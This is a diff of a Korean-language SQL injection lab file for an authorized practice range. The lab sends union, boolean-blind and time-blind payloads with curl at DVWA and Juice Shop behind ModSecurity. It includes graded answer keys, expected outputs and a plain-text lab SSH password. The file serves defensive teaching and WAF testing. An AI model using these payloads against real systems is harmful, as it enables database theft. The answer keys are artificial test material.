@@ -11,9 +11,9 @@ description: |
   페이로드는 공백을 %20, 작은따옴표를 %27 로 URL 인코딩해 전송한다. 같은 요청이 WAF(ModSecurity
   942 룰군)에 잡혀 anomaly score 누적 → 949110 발동 → dvwa 403 으로 차단되는 과정을 modsec_audit.log
   로 확인하고, juice(DetectionOnly)는 같은 페이로드에 200 으로 응답함을 비교한다. 마지막에 모든 유형을
-  한 번에 막는 근본 방어 parameterized query 를 정리한다. 공격 요청은 el34-attacker, 탐지 로그 확인은
-  el34-web 에서 한다. 인가된 실습 환경(el34)에서만 수행하며, 모든 명령은 el34 호스트(ssh ccc@{{TARGET_IP}})에서
-  실행하고, 컨테이너 작업은 docker exec -it <컨테이너> bash 로 접속해 수행한다.
+  한 번에 막는 근본 방어 parameterized query 를 정리한다. 공격은 외부 공격자 VM 192.168.0.202(att/1)에서
+  공인 진입 192.168.0.161로 — `ssh att@192.168.0.202`(비번 1)로 접속해 수행하고, 탐지 로그 확인은
+  `ssh ccc@{{TARGET_IP}}`(el34 호스트) 후 `docker exec -it el34-web bash`. 인가된 실습만.
 difficulty: hard
 duration_minutes: 170
 prerequisites:
@@ -37,17 +37,17 @@ steps:
       SQLi 도 시작할 수 없다. SQLi 점검 대상은 dvwa(차단 모드)와 juice(탐지 전용) 두 곳이다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 내부 발판(attacker)에서 dvwa vhost 도달 확인 — 본문 버리고 응답코드만 dvwa= 형식으로
-      curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/
+      # 1) 외부 공격자 VM 192.168.0.202(attacker)에서 dvwa vhost 도달 확인 — 본문 버리고 응답코드만 dvwa= 형식으로
+      curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://192.168.0.161/
       ```
       ## 🔧 도구/옵션 풀이
-      - `docker exec -it el34-attacker bash` : el34 호스트에서 공격자 컨테이너로 접속해 명령을 실행한다.
+      - `ssh att@192.168.0.202 (비번 1)` : el34 호스트에서 공격자 컨테이너로 접속해 명령을 실행한다.
       - `curl -s` : 진행 표시를 숨김(silent). `-o /dev/null` : 응답 본문은 버린다(코드만 볼 때).
       - `-w 'dvwa=%{http_code}\n'` : 요청 후 HTTP 응답 코드만 `dvwa=<코드>` 형태로 출력한다.
-      - `-H 'Host: dvwa.el34.lab'` : fw 게이트웨이(10.20.30.1)로 보내되 Host 헤더로 dvwa vhost 를 지정.
+      - `-H 'Host: dvwa.el34.lab'` : fw 게이트웨이(192.168.0.161)로 보내되 Host 헤더로 dvwa vhost 를 지정.
       ## ✅ 합격 기준
       `dvwa` 출력 시 통과. **근거:** `dvwa=<코드>` 형태로 응답 코드가 찍히면 대상에 도달한 것이고,
       이로써 SQLi 점검을 시작할 수 있다.
@@ -55,8 +55,8 @@ steps:
     category: survey
     points: 10
     answer: |
-      # 1) 내부 발판(attacker)에서 dvwa vhost 도달 확인 — 본문 버리고 응답코드만 dvwa= 형식으로
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
+      # 1) 외부 공격자 VM 192.168.0.202(attacker)에서 dvwa vhost 도달 확인 — 본문 버리고 응답코드만 dvwa= 형식으로
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://192.168.0.161/"
     answer_detail: "SQLi 점검의 첫 단계 = 대상 도달성 확인. el34 의 SQLi 점검 대상은 dvwa(ModSec 차단 모드, 403)와 juice(DetectionOnly, 200) 두 vhost 다. curl 응답 코드가 출력되면 도달 성공으로 판정한다."
     expected_output: |
       dvwa=302
@@ -80,11 +80,11 @@ steps:
       화면에 직접 빼내는 기법이다. 결과가 곧장 보이므로 가장 빠른 추출이다(lecture §2.1).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) Union-based SQLi(1' UNION SELECT user,password FROM users-- -)를 %27·%20 인코딩해 dvwa에 전송 → 응답코드만 union= 형식으로
-      curl -s -o /dev/null -w 'union=%{http_code}\n' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-"
+      curl -s -o /dev/null -w 'union=%{http_code}\n' -H 'Host: dvwa.el34.lab' "http://192.168.0.161/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-"
       # 2) 해석 — UNION SELECT로 결과에 직접 추출 시도, dvwa는 942→949110으로 403 차단
       echo "→ UNION SELECT로 결과에 직접 데이터 추출 시도. dvwa 403(942 탐지)"
       ```
@@ -101,7 +101,7 @@ steps:
     points: 12
     answer: |
       # 1) Union-based SQLi(1' UNION SELECT user,password FROM users-- -)를 %27·%20 인코딩해 dvwa에 전송 → 응답코드만 union= 형식으로
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'union=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'union=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
       # 2) 해석 — UNION SELECT로 결과에 직접 추출 시도, dvwa는 942→949110으로 403 차단
       echo "→ UNION SELECT로 결과에 직접 데이터 추출 시도. dvwa 403(942 탐지)"
     answer_detail: "Union-based = UNION SELECT 로 다른 테이블(users) 데이터를 원래 결과 뒤에 이어 붙여 화면에 직접 추출하는 기법. 네 유형 중 가장 직접적·빠르다. 페이로드는 %27(작은따옴표)·%20(공백)으로 URL 인코딩해 전송하며, dvwa(차단 모드)에서는 942→949110 으로 403 차단되는 것이 정상이다."
@@ -129,13 +129,13 @@ steps:
       가능하다(lecture §2.2).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) 참 조건(1' AND '1'='1)을 juice에 전송 → 응답코드를 true= 로
-      curl -s -o /dev/null -w 'true=%{http_code} ' -H 'Host: juice.el34.lab' "http://10.20.30.1/?id=1%27%20AND%20%271%27=%271"
+      curl -s -o /dev/null -w 'true=%{http_code} ' -H 'Host: juice.el34.lab' "http://192.168.0.161/?id=1%27%20AND%20%271%27=%271"
       # 2) 거짓 조건(1' AND '1'='2)을 juice에 전송 → 응답코드를 false= 로(참/거짓만 다르고 나머지 동일)
-      curl -s -o /dev/null -w 'false=%{http_code}\n' -H 'Host: juice.el34.lab' "http://10.20.30.1/?id=1%27%20AND%20%271%27=%272"
+      curl -s -o /dev/null -w 'false=%{http_code}\n' -H 'Host: juice.el34.lab' "http://192.168.0.161/?id=1%27%20AND%20%271%27=%272"
       # 3) 해석 — 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론(결과 노출 없어도 추출)
       echo "→ 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론. 결과 노출 없어도 추출 가능"
       ```
@@ -151,9 +151,9 @@ steps:
     points: 12
     answer: |
       # 1) 참 조건(1' AND '1'='1)을 juice에 전송 → 응답코드를 true= 로
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'true=%{http_code} ' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20AND%20%271%27=%271\""
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'true=%{http_code} ' -H 'Host: juice.el34.lab' \"http://192.168.0.161/?id=1%27%20AND%20%271%27=%271\""
       # 2) 거짓 조건(1' AND '1'='2)을 juice에 전송 → 응답코드를 false= 로(참/거짓만 다르고 나머지 동일)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'false=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20AND%20%271%27=%272\""
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'false=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://192.168.0.161/?id=1%27%20AND%20%271%27=%272\""
       # 3) 해석 — 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론(결과 노출 없어도 추출)
       echo "→ 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론. 결과 노출 없어도 추출 가능"
     answer_detail: "Boolean blind = 결과가 화면에 안 보일 때, 참(1=1)/거짓(1=2) 조건에 대한 응답 차이(페이지 길이·내용)로 데이터를 1비트씩 추론하는 간접 기법. Union 보다 느리지만 결과가 직접 노출되지 않는 곳에서도 추출할 수 있다. 참/거짓 두 요청이 모두 전송되면 시도 성공으로 판정한다."
@@ -180,11 +180,11 @@ steps:
       화면에 아무 차이가 없어도 응답 시간만으로 참/거짓을 추론한다 — 가장 느린 추출이다(lecture §2.3).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) Time blind(1' AND SLEEP(3)-- -)를 dvwa에 전송 → 응답코드(time=)와 총 응답시간(응답시간=초) 출력
-      curl -s -o /dev/null -w 'time=%{http_code} 응답시간=%{time_total}s\n' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20AND%20SLEEP(3)--%20-"
+      curl -s -o /dev/null -w 'time=%{http_code} 응답시간=%{time_total}s\n' -H 'Host: dvwa.el34.lab' "http://192.168.0.161/?id=1%27%20AND%20SLEEP(3)--%20-"
       # 2) 해석 — SLEEP으로 응답 지연 유발 → 시간차로 추론, dvwa는 SLEEP 패턴을 942로 탐지(403)
       echo "→ SLEEP으로 응답 지연 유발 → 시간차로 추론. WAF가 SLEEP 패턴 탐지(403)"
       ```
@@ -200,7 +200,7 @@ steps:
     points: 12
     answer: |
       # 1) Time blind(1' AND SLEEP(3)-- -)를 dvwa에 전송 → 응답코드(time=)와 총 응답시간(응답시간=초) 출력
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'time=%{http_code} 응답시간=%{time_total}s\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20AND%20SLEEP(3)--%20-\""
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'time=%{http_code} 응답시간=%{time_total}s\n' -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?id=1%27%20AND%20SLEEP(3)--%20-\""
       # 2) 해석 — SLEEP으로 응답 지연 유발 → 시간차로 추론, dvwa는 SLEEP 패턴을 942로 탐지(403)
       echo "→ SLEEP으로 응답 지연 유발 → 시간차로 추론. WAF가 SLEEP 패턴 탐지(403)"
     answer_detail: "Time blind = SLEEP() 등으로 응답을 일부러 지연시켜, 응답이 늦으면 참·빠르면 거짓으로 시간차 추론하는 기법. 응답 차이도 에러도 없는 가장 어려운 환경의 최후 수단이라 가장 느리다. dvwa 차단 모드에서는 SLEEP 패턴이 942 에 탐지되어 403 으로 막히며, time= 코드와 응답시간= 이 출력되면 시도 성공으로 판정한다."
@@ -280,13 +280,13 @@ steps:
       403), juice 는 DetectionOnly(탐지·기록만 하고 200 통과). 운영자의 정책 선택이다(lecture §1.3, §3.3).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) 동일 페이로드(1' UNION SELECT 1--)를 dvwa(차단 모드)에 전송 → dvwa= 응답코드
-      curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--"
+      curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' "http://192.168.0.161/?id=1%27%20UNION%20SELECT%201--"
       # 2) 같은 페이로드를 juice(DetectionOnly)에 전송 → juice= 응답코드(차이는 Host=vhost의 ModSec 모드뿐)
-      curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' "http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--"
+      curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' "http://192.168.0.161/?id=1%27%20UNION%20SELECT%201--"
       # 3) 해석 — dvwa=403(차단), juice=200(DetectionOnly). 같은 SQLi 다른 결과
       echo "→ dvwa=403(차단), juice=200(DetectionOnly). 같은 SQLi 다른 결과"
       ```
@@ -301,9 +301,9 @@ steps:
     points: 12
     answer: |
       # 1) 동일 페이로드(1' UNION SELECT 1--)를 dvwa(차단 모드)에 전송 → dvwa= 응답코드
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?id=1%27%20UNION%20SELECT%201--\""
       # 2) 같은 페이로드를 juice(DetectionOnly)에 전송 → juice= 응답코드(차이는 Host=vhost의 ModSec 모드뿐)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://192.168.0.161/?id=1%27%20UNION%20SELECT%201--\""
       # 3) 해석 — dvwa=403(차단), juice=200(DetectionOnly). 같은 SQLi 다른 결과
       echo "→ dvwa=403(차단), juice=200(DetectionOnly). 같은 SQLi 다른 결과"
     answer_detail: "같은 SQLi 페이로드를 dvwa/juice 에 보냈을 때의 차이는 취약점이 아니라 WAF 정책에서 온다 — dvwa 는 차단 모드라 949110 발동 시 403, juice 는 DetectionOnly 라 탐지·기록만 하고 200 통과. dvwa=403·juice=200 이 나오면 모드 차이를 확인한 것. 실전에서는 DetectionOnly 로 false-positive 를 튜닝한 뒤 차단 모드로 전환한다."
